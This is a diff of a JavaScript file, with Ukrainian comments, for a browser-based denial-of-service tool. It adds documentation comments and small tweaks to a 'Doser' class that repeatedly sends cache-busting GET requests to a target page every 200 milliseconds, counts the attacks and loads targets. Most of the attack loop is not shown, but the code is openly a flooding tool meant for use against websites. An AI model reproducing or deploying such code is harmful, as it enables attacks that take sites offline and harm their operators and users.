@@ -1,12 +1,19 @@
 const attackInterval = 200
 
-// Функції для керування документом
+/**
+ * Зберігання данних про атаки
+ * @param {Response} r **Запит**
+ */
 function add_count(r) {
     attacks.text(parseInt(attacks.text()) + 1);
     (d => d.attacks ? d.attacks = parseInt(d.attacks) + 1 : d.attacks = 1)(Database)
-    console.log(r.code)
+    console.log(r.ok)
 }
 
+/**
+ * Паказ цілі користувачу
+ * @param {?JSON} target **Ціль**
+ */
 function setTarget(target) {
 	if (target) {
 		targetField.text(target.page);
@@ -15,16 +22,24 @@ function setTarget(target) {
 	};
 }
 
-
+/**
+ * Генерація **GET** запиту
+ * @param {JSON} target **Ціль**
+ */
 const composeVictim = async target => `${target.page}?data=${getRandomArbitrary()}`;
 
-
+/**
+ * Воркер
+ */
 class Doser {
+	/**
+	 * Запуск атаки
+	 * @param {Boolean} isFetch 
+	 */
     async start(isFetch=true) {
     	this.attack = true; // Статус атаки
 
         // Запуск атаки
-
         btn.text("Стоп");
 
         // Створення сповіщення про завантаження цілей
@@ -66,6 +81,9 @@ class Doser {
         	if ($("#frames")[0].childElementCount >= 100) Frames.clear();
         }, attackInterval)
     };
+	/**
+	 * Зупинка атаки
+	 */
     stop() {
     	if (this.interval) {
 	    	this.attack = false;
